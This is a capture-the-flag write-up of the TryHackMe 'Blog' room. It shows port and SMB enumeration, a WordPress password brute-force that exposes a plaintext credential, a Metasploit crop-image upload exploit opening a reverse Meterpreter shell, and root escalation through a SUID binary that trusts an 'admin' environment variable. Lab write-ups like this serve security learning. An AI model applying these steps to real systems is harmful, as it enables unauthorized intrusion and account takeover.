# Tryhackme: Blog
<img src="https://user-images.githubusercontent.com/87611022/174065126-3a6b22ce-2b40-47e9-b3fd-2dc8d42678a6.png" alt="Blog" width="200"/>

## _Billy Joel made a Wordpress blog!_

As usual we start by enumerating the machine using a port scanner, one of my personal favorites is the Mayor's multi threader port scanner [Threader3000](https://github.com/dievus/threader3000).

Anyways to the port scanning:
```
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.10.29.101                      
------------------------------------------------------------
Scanning target 10.10.29.101
Time started: 2022-06-14 13:15:27.606196
------------------------------------------------------------
Port 22 is open
Port 139 is open
Port 80 is open
Port 445 is open
Port scan completed in 0:00:28.859030
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,139,80,445 -sV -sC -T4 -Pn -oA 10.10.29.101 10.10.29.101
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p22,139,80,445 -sV -sC -T4 -Pn -oA 10.10.29.101 10.10.29.101
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-14 13:18 EDT
Nmap scan report for 10.10.29.101
Host is up (0.074s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2022-06-14T17:18:50+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-06-14T17:18:50
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.73 seconds
------------------------------------------------------------
Combined scan completed in 0:03:26.200751
Press enter to quit...
```
from the output above we can see an interesting service running on the host, Samba!

Let's further enumerate this service using [enum4linux](https://github.com/CiscoCXSecurity/enum4linux):
```
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy's local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
.
.
.
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''            
                                                                                       
S-1-22-1-1000 Unix User\bjoel (Local User)                                             
S-1-22-1-1001 Unix User\smb (Local User)

```
enum4linux found us some potentially useful information, the username: **bjoel** and the share: **BillySMB**.

we further explore this Samba service:
```
smbclient \\\\10.10.29.101/BillySMB
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 14:17:05 2020
  ..                                  D        0  Tue May 26 13:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 14:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 14:13:45 2020
  check-this.png                      N     3082  Tue May 26 14:13:43 2020

                15413192 blocks of size 1024. 9790376 blocks available
smb: \> prompt
smb: \> mget *
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (88.6 KiloBytes/sec) (average 88.6 KiloBytes/sec)
getting file \tswift.mp4 of size 1236733 as tswift.mp4 (1841.1 KiloBytes/sec) (average 1211.3 KiloBytes/sec)
getting file \check-this.png of size 3082 as check-this.png (10.2 KiloBytes/sec) (average 942.6 KiloBytes/sec)
```
the first thing that comes to my mind when I see a jpg image is using [steghide](https://www.kali.org/tools/steghide/)! (also **spoiler alert**: this image was used in another box called Wonderland)
```
steghide extract -sf Alice-White-Rabbit.jpg                                  
Enter passphrase: 
wrote extracted data to "rabbit_hole.txt".

cat rabbit_hole.txt  
You've found yourself in a rabbit hole, friend.
```
The other files are a QR code and a png image that leads to the same conclusion: This Samba service is a rabbit hole :(

We shift our efforts to the web server hosted on this machine on port 80, it's a simple Wordpress website.
Also from our port scan above we can see there's a **robots.txt** file which mentions a Disallowed entry: /_wp-admin_

We navigate to /_wp-admin_ and try the user's we found using enum4linux **bjoel**

![image](https://user-images.githubusercontent.com/87611022/173656287-159cd0bd-c200-463a-98f7-af8d4ffe805b.png)

we can see that's it's a valid username, also using [wpscan](https://wpscan.com/wordpress-security-scanner) we found some couple other usernames:
```
[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)
```
Bruteforcing the password for these usernames got us the password for **kwheel**
```
[!] Valid Combinations Found:
 | Username: kwheel, Password: 
 ```
From the wpscan we did earlier we can see that this wordpress website runs on the version 5.0 which is vulnerable to path traversal [CVE 2019-8943](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiJuqnuyq34AhUQi_0HHQUYDuIQFnoECAYQAQ&url=https%3A%2F%2Fcve.mitre.org%2Fcgi-bin%2Fcvename.cgi%3Fname%3DCVE-2019-8943&usg=AOvVaw31RQDmn7zjnh45-ckAj5Yl).

I used metasploit to exploit this vulnerability:
```
   #  Name                            Disclosure Date  Rank       Check  Description
   -  ----                            ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload                                                                    
```
We set the required options and send the exploit and boom! we got a shell:
```
msf6 exploit(multi/http/wp_crop_rce) > exploit

[*] Started reverse TCP handler on 10.8.252.202:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39860 bytes) to 10.10.29.101
[*] Attempting to clean up files...
[*] Meterpreter session 1 opened (10.8.252.202:4444 -> 10.10.29.101:54758) at 2022-06-14 14:38:39 -0400

meterpreter > 
```
the next step is to enumerate for possible privillege escalation exploits in the machine.
I used [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
we found an unknown binary with the SUID bit set:
```
-rwsr-sr-x 1 root root 8.3K May 26  2020 /usr/sbin/checker (Unknown SUID binary)
```
The binary outputs the following when we run it:
```
./checker
Not an Admin

```
we further analyze this binary using a reverse engineering tool like [Ghidra](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjdrqfpgbL4AhVP_bsIHQtgCVwQFnoECAUQAQ&url=https%3A%2F%2Fghidra-sre.org%2F&usg=AOvVaw0L6uCxCJLDPCI2KQM3Ks-w).

![image](https://user-images.githubusercontent.com/87611022/174074716-8effb210-c1f6-4089-b109-52d6c2e9eb5a.png)

from the image above we can notice that it checks for an environment variable called "admin".
we can simply set the variable to any value and it will give us root privileges.
```
export admin=shawarma
./checker
id
uid=0(root) gid=33(www-data) groups=33(www-data)
 ```
 next I used this command to find the real user.txt:
 ```
root@blog:/# find -iname user.txt
find -iname user.txt
./home/bjoel/user.txt
./media/usb/user.txt
```
and of course you know where to find the root.txt :D

Anyways that's all for this room it was really fun :))
Thanks for reading through this write-up 
